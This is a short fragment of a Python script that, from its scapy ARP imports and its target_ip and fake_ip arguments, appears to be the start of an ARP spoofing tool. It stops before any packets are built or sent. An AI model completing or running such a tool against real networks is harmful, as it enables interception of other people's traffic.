#!/usr/bin/python3

import sys
import time
from scapy.all import sendp , ARP , Ether

iface = "wlp2s0"
target_ip = sys. argv[1]
fake_ip = sys.argv[2]